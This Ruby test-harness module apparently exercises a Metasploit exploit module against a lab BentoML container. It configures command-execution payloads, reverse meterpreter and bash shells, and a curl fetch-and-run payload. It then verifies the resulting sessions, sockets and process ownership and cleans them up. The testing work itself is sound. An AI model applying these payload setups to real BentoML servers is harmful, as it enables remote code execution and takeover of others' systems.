# frozen_string_literal: true

require_relative '../rsync_creds/native'

# Real BentoML protocol controls, command/session proof and selected recovery.
module BentoMLTarget
  include RsyncCredentialTarget

  def be_config
    @be_config ||= JSON.parse(File.read('test/module_targets/bentoml/profiles.json'))
  end

  def rc_owner
    be_config.fetch('owners').fetch(@mode)
  end

  def be_source
    'modules/' + rc_owner.sub(%r{\Aexploit/}, 'exploits/') + '.rb'
  end

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'bentoml.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['app']
  end

  def rc_command(label, role, *, required: true)
    super(label, role == 'linux' ? 'app' : role, *, required: required)
  end

  def be_native(phase)
    directory = File.join(target_runtime.fetch('artifacts'), 'native-' + phase)
    FileUtils.mkdir_p(directory)
    runtime = { directory: directory, compose: target_runtime.fetch('compose'), release: @release, mode: @mode, stamp: "#{Process.pid}-#{phase}-#{@mode}" }
    path = File.join(directory, 'runtime.json')
    File.write(path, JSON.pretty_generate(runtime))
    output, error, status = Open3.capture3('python3', 'test/module_targets/bentoml/native_control.py', path)
    File.write(File.join(directory, 'process.stdout'), output)
    File.write(File.join(directory, 'process.stderr'), error)
    expect(status.success?).to be(true), error + output
    proof = JSON.parse(File.read(File.join(directory, 'native-proof.json')))
    expect(proof.fetch('native_passed')).to be(true)
    @rc.fetch(:native) << { phase: phase, data: proof }
    rc_resources(phase)
    rc_save
  end

  def be_json_file(path)
    code = "import base64,json,sys;from pathlib import Path;p=Path(sys.argv[1]);s=p.stat() if p.is_file() else None;print(json.dumps({'exists':s is not None,'uid':s.st_uid if s else None,'base64':base64.b64encode(p.read_bytes()).decode() if s else None}))"
    output, = rc_command('inspect-file', 'app', 'python3', '-c', code, path)
    JSON.parse(output)
  end

  def be_port
    socket = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def be_tcp(port)
    code = "import json,sys;port=int(sys.argv[1]);uid=int(sys.argv[2]);rows=[v for v in [line.split() for line in open('/proc/net/tcp').read().splitlines()[1:]] if int(v[2].split(':')[1],16)==port and int(v[7])==uid];print(json.dumps([{'remote':v[2],'state':v[3],'uid':int(v[7]),'inode':v[9]} for v in rows]))"
    output, = rc_command('session-tcp-state', 'app', 'python3', '-c', code, port.to_s, be_config.fetch('uid').to_s)
    JSON.parse(output)
  end

  def be_socket_owners(port)
    code = <<~PYTHON
      from pathlib import Path
      import json,os,sys
      port,uid=map(int,sys.argv[1:])
      rows=[line.split() for line in Path('/proc/net/tcp').read_text().splitlines()[1:]]
      sockets=[{'inode':row[9],'state':row[3]} for row in rows if int(row[2].split(':')[1],16)==port and int(row[7])==uid]
      wanted={row['inode'] for row in sockets}
      owners=[]
      errors=[]
      for process in Path('/proc').glob('[0-9]*'):
          try:
              fields=dict(line.split(':',1) for line in (process/'status').read_text().splitlines())
              if int(fields['Uid'].split()[0])!=uid:
                  continue
              matches=[]
              for descriptor in (process/'fd').iterdir():
                  try:
                      target=os.readlink(descriptor)
                      if target.startswith('socket:[') and target[8:-1] in wanted:
                          matches.append({'fd':descriptor.name,'inode':target[8:-1]})
                  except FileNotFoundError:
                      pass
              if matches:
                  owners.append({'pid':int(process.name),'ppid':int(fields['PPid']),'name':fields['Name'].strip(),'state':fields['State'].strip(),'uid':uid,'descriptors':matches})
          except FileNotFoundError:
              pass
          except PermissionError as error:
              errors.append({'pid':int(process.name),'error':str(error)})
      print(json.dumps({'sockets':sockets,'owners':owners,'errors':errors}))
    PYTHON
    output, = rc_command('session-socket-owners', 'app', 'python3', '-c', code, port.to_s, be_config.fetch('uid').to_s)
    JSON.parse(output)
  end

  def be_process(pid)
    code = "import json,sys;from pathlib import Path;p=Path('/proc')/sys.argv[1]/'status';s=p.read_text() if p.exists() else '';print(json.dumps({'exists':bool(s),'uid':int(next(l for l in s.splitlines() if l.startswith('Uid:')).split()[1]) if s else None,'state':next(l for l in s.splitlines() if l.startswith('State:')).split()[1] if s else None}))"
    output, = rc_command('session-native-process', 'app', 'python3', '-c', code, pid.to_s)
    JSON.parse(output)
  end

  def be_call(label, options = {}, action: 'run -z', reuse: false)
    record = { label: label, options: options, action: action }
    @rc.fetch(:calls) << record
    selected = { 'SSL' => false, 'TARGET' => 0, 'PAYLOAD' => 'python/exec', 'AutoCheck' => true, 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'HttpClientTimeout' => 4 }.merge(options)
    selected['CMD'] = 'true' if %w[python/exec cmd/unix/generic].include?(selected.fetch('PAYLOAD')) && !selected.key?('CMD')
    run_target_module(rc_owner, 'app', selected, action: action, allow_errors: true, reuse_module: reuse, command_timeout: 90) do |output|
      record[:output_base64] = Base64.strict_encode64(output.b)
      record[:module_identity] = rc_json('{object_id:active_module.object_id,config:Msf::Config.config_directory}')
      rc_save
    end
  end

  def be_canary(label, target: 0, expected_execution: true, extra: {})
    path = "/tmp/module-target-bentoml-owner-#{Process.pid}-#{label}"
    expect(be_json_file(path).fetch('exists')).to be(false)
    payload = target.zero? ? 'python/exec' : 'cmd/unix/generic'
    output = be_call(label, { 'TARGET' => target, 'PAYLOAD' => payload, 'CMD' => 'printf %s bentoml-owner > ' + path }.merge(extra))
    expect(output).not_to include('Exploit failed', 'Exploit aborted') if expected_execution
    expected = expected_execution ? { 'exists' => true, 'uid' => be_config.fetch('uid'), 'base64' => Base64.strict_encode64('bentoml-owner') } : { 'exists' => false, 'uid' => nil, 'base64' => nil }
    begin
      rc_poll(5) { be_json_file(path) == expected }
    rescue RuntimeError
      expect(be_json_file(path)).to eq(expected)
    end
    @rc.fetch(:canaries) << { label: label, expected_execution: expected_execution, observed: be_json_file(path) }
    rc_save
    output
  ensure
    rc_command('remove-owner-proof', 'app', 'rm', '-f', path) if path
    expect(be_json_file(path).fetch('exists')).to be(false) if path
  end

  def be_session_setup
    rc_callback
    @observer = rc_json('begin;load "test/module_targets/druid_sessions/session_control.rb";DruidSessionControl.install(framework);end')
    @rc[:sessions] = []
    @rc[:payload_sources] = rc_json('begin;{payloads:Gem.loaded_specs.fetch("metasploit-payloads").version.to_s,python_sha256:Digest::SHA256.file(MetasploitPayloads.path("meterpreter","meterpreter.py")).hexdigest};end')
  end

  def be_session(label, family, reuse: false)
    payload = { 'staged' => 'python/meterpreter/reverse_tcp', 'single' => 'python/meterpreter_reverse_tcp', 'python_shell' => 'python/shell_reverse_tcp', 'bash' => 'cmd/unix/reverse_bash', 'fetch' => 'cmd/linux/http/x64/meterpreter_reverse_tcp' }.fetch(family)
    target = %w[bash fetch].include?(family) ? 1 : 0
    callback = @rc.fetch(:callback)
    port = be_port
    expect(be_tcp(port)).to eq([])
    options = { 'TARGET' => target, 'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port, 'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false, 'AutoCheck' => !reuse, 'WfsDelay' => 15 }
    if family == 'fetch'
      fetched = "/tmp/module-target-bentoml-fetch-#{Process.pid}-#{label}"
      options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => be_port, 'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => File.basename(fetched), 'FETCH_DELETE' => true)
    end
    output = be_call(label, options, reuse: reuse)
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created', 'Unknown datastore option')
    expected_type = %w[python_shell bash].include?(family) ? 'shell' : 'meterpreter'
    metadata = rc_poll(30) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,klass:s.class.name}}')
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |session| session.fetch('type') == expected_type && ready.any? { |event| event.fetch('id') == session.fetch('id') } }
    end
    expect(metadata.values_at('owner', 'payload')).to eq([rc_owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(be_json_file(proof).fetch('exists')).to be(false)
    if expected_type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      expected = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('bentoml-session');ensure;f.close if f;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid,platform:s.platform};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      expected = 'bentoml-session'
    end
    expect(be_json_file(proof)).to eq('exists' => true, 'uid' => be_config.fetch('uid'), 'base64' => Base64.strict_encode64(expected))
    sockets = be_tcp(port)
    expect(sockets).to include(include('state' => '01', 'uid' => be_config.fetch('uid')))
    native = be_process(result.fetch('pid')) unless family == 'python_shell'
    expect(native.fetch('uid')).to eq(be_config.fetch('uid')) if native
    record = { label: label, **metadata, proof: result, socket: sockets, port: port, native_process: native, fetched: fetched, owners_before: be_socket_owners(port) }
    @rc.fetch(:sessions) << record
    rc_save
  ensure
    rc_command('remove-session-proof', 'app', 'rm', '-f', proof) if proof
    expect(be_json_file(proof).fetch('exists')).to be(false) if proof
    begin
      if identifier
        rc_json("DruidSessionControl.exit_remote(framework,#{identifier})") if family == 'bash'
        rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
        rc_poll(15) { be_tcp(port).none? { |socket| %w[01 08].include?(socket.fetch('state')) } }
        if result && %w[bash fetch].include?(family)
          rc_poll(15) do
            process = be_process(result.fetch('pid'))
            !process.fetch('exists') || process.fetch('state') == 'Z'
          end
        end
      end
      rc_poll(15) { !be_json_file(fetched).fetch('exists') } if fetched
    ensure
      if identifier && record
        record[:recovery] = { socket: be_tcp(port), owners: be_socket_owners(port), process: be_process(result.fetch('pid')) }
      end
      console_command('jobs -K')
      expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
      rc_resources(label)
      rc_save
    end
  end
end
